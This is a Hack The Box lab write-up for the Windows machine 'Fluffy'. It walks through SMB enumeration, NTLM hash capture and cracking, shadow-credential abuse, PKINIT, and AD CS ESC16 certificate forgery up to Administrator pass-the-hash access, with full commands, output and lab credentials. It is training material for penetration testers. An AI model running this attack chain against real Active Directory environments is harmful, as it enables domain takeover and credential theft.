# Fluffy

![Fluffy Box Icon](https://talented-bolt-7ab.notion.site/image/attachment%3A28eb289c-de5f-4578-be2b-b7b798213493%3Aimage.png?id=2018360c-afc5-801c-a37d-f31ace2ff3df&table=block&spaceId=f0f1096b-39d2-4b33-a75d-344b617a6eee&width=250&userId=&cache=v2)

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Fluffy)  
**OS:** Windows  
**Difficulty:** Easy

## Summary

This box involves exploiting SMB shares, leveraging Active Directory Certificate Services (AD CS) vulnerabilities, and performing Kerberos-based attacks to achieve privilege escalation.

---

## Initial Credentials

- **Username:** `j.fleischman`
- **Password:** `J0elTHEM4n1990!`

---

## Important Note: Clock Skew Error

**Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)**

This means your system's clock is not synchronized closely enough with the Domain Controller (DC). Kerberos is time-sensitive — by default, it allows only a 5-minute clock skew between client and server.

**Fix (Linux):**
```bash
sudo ntpdate <DC-IP>
```

**Fix (Windows):**
```cmd
w32tm /resync /manualpeerlist:<DC-IP>
```

---

## Enumeration

### Port Scan

```bash
nmap -F 10.10.11.69
```

**Output:**
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
```

**Domain:** `fluffy.htb`

### Service Principal Names (SPNs)

```bash
impacket-GetUserSPNs fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.10.11.69
```

**Output:**
```
ADCS/ca.fluffy.htb      ca_svc      CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
LDAP/ldap.fluffy.htb    ldap_svc    CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
WINRM/winrm.fluffy.htb  winrm_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
```

### User Enumeration

```bash
nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --users
```

**Users Found:**
- j.fleischman
- j.coffey
- winrm_svc
- p.agila
- ldap_svc
- ca_svc
- krbtgt
- Guest
- Administrator

### SMB Share Enumeration

```bash
nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
smbclient -L 10.10.11.69 -U j.fleischman --password='J0elTHEM4n1990!'
```

**Output:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
IT              Disk
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

### Accessing IT Share

```bash
smbclient //10.10.11.69/IT -U j.fleischman --password='J0elTHEM4n1990!'
```

**Output:**
```
smb: \> ls
  .                                   D        0  Mon May 19 10:27:02 2025
  ..                                  D        0  Mon May 19 10:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
```

**Note:** KeePass is a password manager. The folder contains both zipped and unzipped versions of the same files.

---

## Vulnerability Analysis

### CVEs in Upgrade Notice

The `Upgrade_Notice.pdf` mentions several critical CVEs requiring patching:

#### CVE-2025-24996 (Critical)
Vulnerability in Windows NTLM authentication that allows attackers to perform network spoofing by exploiting external control of file names or paths, potentially leading to unauthorized access to sensitive information.

#### CVE-2025-24071 (Critical)
Vulnerability in Windows File Explorer that allows attackers to capture NTLM hashes by tricking the system into sending authentication requests when a user extracts a specially crafted `.library-ms` file from a compressed archive, potentially leading to unauthorized access.

**Exploit Repository:** [CVE-2025-24071-msfvenom](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom)

#### Other CVEs
- **CVE-2025-46785:** A buffer over-read vulnerability in Zoom Workplace Apps for Windows that allows authenticated users to cause a denial of service via network access.
- **CVE-2025-29968:** An improper input validation flaw in Microsoft Active Directory Certificate Services (AD CS) that enables authorized attackers to perform denial-of-service attacks over a network.

---

## Exploitation

### Capturing NTLM Hash with Responder

```bash
sudo responder -I tun0
```

![Responder Capture](https://talented-bolt-7ab.notion.site/image/attachment%3Af55111e4-5cda-404e-9d94-1b80d8360d0a%3Aimage.png?table=block&id=2018360c-afc5-804a-9976-cdeee23cb477&spaceId=f0f1096b-39d2-4b33-a75d-344b617a6eee&width=2000&userId=&cache=v2)

After triggering the vulnerability, Responder captured the NTLM hash for user `p.agila`.

### Cracking the Hash

```bash
john --format=netntlmv2 -w=/usr/share/wordlists/rockyou.txt p.agila_hashes
```

**Output:**
```
prometheusx-303 (p.agila)
prometheusx-303 (p.agila)
```

**Cracked Credentials:**
- **Username:** `p.agila`
- **Password:** `prometheusx-303`

---

## BloodHound Enumeration

```bash
nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --bloodhound --collection ALL --dns-server 10.10.11.69
```

![BloodHound Results](https://talented-bolt-7ab.notion.site/image/attachment%3Af026416b-4894-48ca-a24e-51472d88b1c7%3Aimage.png?table=block&id=2018360c-afc5-80a4-baf4-ef13bed74113&spaceId=f0f1096b-39d2-4b33-a75d-344b617a6eee&width=2000&userId=&cache=v2)

### Research Areas Identified

Based on BloodHound analysis, the following attack paths were identified:
- **Targeted Kerberoasting**
- **Abusing GenericWrite** on:
  - ldap_svc
  - winrm_svc
  - ca_svc
- **Shadow Credentials**
- **PKINIT**
- **AD CS ESC16**

---

## Privilege Escalation via Shadow Credentials

### Abusing GenericWrite with Pywhisker

**Reference:** [pywhisker - GitHub](https://github.com/ShutdownRepo/pywhisker)

#### Adding Shadow Credentials

```bash
sudo python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
```

**Output:**
```
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: ce4ecc88-2be3-0d00-75d3-29e534ea64ba
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: bT7cGgq6.pfx
[+] PFX exportiert nach: bT7cGgq6.pfx
[i] Passwort für PFX: WXQozpzogvImSumG8FUk
[+] Saved PFX (#PKCS12) certificate & key at path: bT7cGgq6.pfx
[*] Must be used with password: WXQozpzogvImSumG8FUk
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

**Key Information:**
- DeviceID: `ce4ecc88-2be3-0d00-75d3-29e534ea64ba`
- PFX file: `bT7cGgq6.pfx`
- PFX password: `WXQozpzogvImSumG8FUk`

#### Listing Shadow Credentials

```bash
python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "list"
```

**Output:**
```
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Listing devices for ca_svc
[*] DeviceID: 7ee9ec54-3d55-4487-805f-0c4c9ddee635 | Creation Time (UTC): 2025-05-29 07:02:53.873896
[*] DeviceID: 2541eed3-64c3-3005-1377-d7938d1d25a2 | Creation Time (UTC): 2025-05-29 07:02:37.210213
[*] DeviceID: ce4ecc88-2be3-0d00-75d3-29e534ea64ba | Creation Time (UTC): 2025-05-29 07:02:59.388189
```

---

## PKINIT Authentication

**Reference:** [PKINITtools - GitHub](https://github.com/dirkjanm/PKINITtools)

PKINITtools requests a TGT using a PFX file (either as file or base64 encoded blob, or PEM files for cert+key). This uses Kerberos PKINIT and outputs a TGT into the specified ccache.

### Requesting TGT

```bash
python gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx ../pywhisker/pywhisker/bT7cGgq6.pfx -pfx-pass WXQozpzogvImSumG8FUk ca_svc.ccache
```

**Output:**
```
2025-05-29 11:01:46,343 minikerberos INFO Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-29 11:01:46,384 minikerberos INFO Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-29 11:01:48,722 minikerberos INFO AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-29 11:01:48,722 minikerberos INFO d2c135b38aaba6fefcf50bac9f15e101b3921ce90bfde7babeb23dbef1f226a0
INFO:minikerberos:d2c135b38aaba6fefcf50bac9f15e101b3921ce90bfde7babeb23dbef1f226a0
2025-05-29 11:01:48,729 minikerberos INFO Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

**AS-REP Encryption Key:**
```
d2c135b38aaba6fefcf50bac9f15e101b3921ce90bfde7babeb23dbef1f226a0
```

This is a Kerberos AS-REP decryption key used to decrypt the AS-REP (Authentication Service Reply) in a Kerberos authentication exchange. It is derived from the user's credentials and is needed in tools like `getnthash.py` to decrypt the PAC (Privilege Attribute Certificate) data embedded inside the TGT and extract the real NT hash from it.

### Handling Clock Skew (KRB_AP_ERR_SKEW)

If you encounter clock skew errors:

```bash
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u 10.10.11.69
```

### Extracting NT Hash

This tool uses Kerberos S4U2Self to request a service ticket that is valid on the host for which you've obtained a certificate.

```bash
python getnthash.py fluffy.htb/ca_svc -key d2c135b38aaba6fefcf50bac9f15e101b3921ce90bfde7babeb23dbef1f226a0
```

**Output:**
```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8
```

**Recovered NT Hash:** `ca0f4f9e9eb8a092addf53bb03fc98c8`

---

## AD CS ESC16 Exploitation

### Using Certipy

**Reference:** [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/)

#### Installation

```bash
pip install certipy-ad
```

#### Finding Vulnerabilities

```bash
certipy find -dc-ip 10.10.11.69 -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
```

**Output:**
```
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment                      : 
      HTTP                              :
        Enabled                         : False
      HTTPS                             :
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates :
[!] Could not find any certificate templates
```

**Key Finding:**
- **ESC16:** Security Extension is disabled on CA globally
- Reference: [ESC16 Documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)

### Understanding ESC16

ESC16 occurs when the `szOID_CERTSRV_CA_VERSION` security extension is disabled on a Certificate Authority. This can allow attackers to request certificates for other users or computers, leading to privilege escalation.

### Reading ca_svc Attributes

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -user 'ca_svc' read
```

**Output:**
```
[*] Reading attributes for 'ca_svc':
cn                    : certificate authority service
distinguishedName     : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
name                  : certificate authority service
objectSid             : S-1-5-21-497550768-2797716248-2627064577-1103
sAMAccountName        : ca_svc
servicePrincipalName  : ADCS/ca.fluffy.htb
userPrincipalName     : ca_svc@fluffy.htb
userAccountControl    : 66048
whenCreated           : 2025-04-17T16:07:50+00:00
whenChanged           : 2025-05-29T20:47:40+00:00
```

### Attempting to Update UPN to Administrator

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -upn 'administrator' -user 'ca_svc' update
```

**Output:**
```
[*] Updating user 'ca_svc':
    userPrincipalName : administrator
[-] Received error: 000021C8: AtrErr: DSID-03200E96, #1:0: 000021C8: DSID-03200E96, problem 1005 (CONSTRAINT_ATT_TYPE), data 0, Att 90290 (userPrincipalName)
```

**Issue:** The error code `000021C8` with `CONSTRAINT_ATT_TYPE` for `userPrincipalName` indicates that the UPN value is already in use within the domain or forest. This means there is already a user with the `administrator` UPN.

**Solution:** First rollback the UPN to `ca_svc@fluffy.htb`, then update it to `administrator@fluffy.htb`.

### Rollback UPN to ca_svc@fluffy.htb

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

**Output:**
```
[*] Updating user 'ca_svc':
    userPrincipalName : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

### Update UPN to administrator@fluffy.htb

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -upn 'administrator@fluffy.htb' -user 'ca_svc' update
```

**Output:**
```
[*] Updating user 'ca_svc':
    userPrincipalName : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

### Requesting Certificate as Administrator

```bash
certipy req -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -ca 'fluffy-DC01-CA' -template 'User' -upn 'administrator@fluffy.htb'
```

**Output:**
```
[*] Requesting certificate via RPC
[*] Request ID is 67
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### First Authentication Attempt (Failed)

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69
```

**Output:**
```
[*] Certificate identities:
[*] SAN UPN: 'administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] Verify that the username 'administrator' matches the certificate UPN: administrator@fluffy.htb
[-] See the wiki for more information
```

**Issue:** Name mismatch error - the ca_svc account still has the administrator UPN set.

### Rollback UPN Again to ca_svc@fluffy.htb

```bash
certipy account -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'fluffy.htb' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

**Output:**
```
[*] Updating user 'ca_svc':
    userPrincipalName : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

### Successful Authentication with Certificate

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69
```

**Output:**
```
[*] Certificate identities:
[*] SAN UPN: 'administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

**Administrator Credentials:**
- TGT saved to: `administrator.ccache`
- NT Hash: `aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e`

---

## Remote Access

### Evil-WinRM

```bash
evil-winrm -i 10.10.11.69 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

### PsExec

```bash
impacket-psexec fluffy.htb/Administrator@10.10.11.69 -hashes :8da83a3fa618b6e3a00e93f676c92a6e
```

---

## Final Credentials

- **Username:** `Administrator`
- **NT Hash:** `8da83a3fa618b6e3a00e93f676c92a6e`

---

## Key Takeaways

1. **Clock Synchronization:** Always synchronize your clock with the DC when working with Kerberos to avoid `KRB_AP_ERR_SKEW` errors.

2. **CVE-2025-24071 Exploitation:** This vulnerability can be exploited to capture NTLM hashes via malicious `.library-ms` files in compressed archives.

3. **Shadow Credentials Attack:** GenericWrite permissions on user accounts can be abused to add shadow credentials using tools like pywhisker.

4. **PKINIT for Authentication:** Certificate-based authentication via PKINIT can be used to request TGTs and extract NT hashes.

5. **ESC16 Vulnerability:** When the security extension is disabled on a CA, attackers can request certificates for arbitrary users by manipulating the UPN attribute.

6. **UPN Manipulation Strategy:** The key to exploiting ESC16 is:
   - Set victim account UPN to target user's UPN
   - Request certificate with target UPN
   - Rollback victim account UPN to original
   - Authenticate with the certificate to obtain target user's credentials

7. **BloodHound Value:** BloodHound enumeration is critical for identifying privilege escalation paths in Active Directory environments.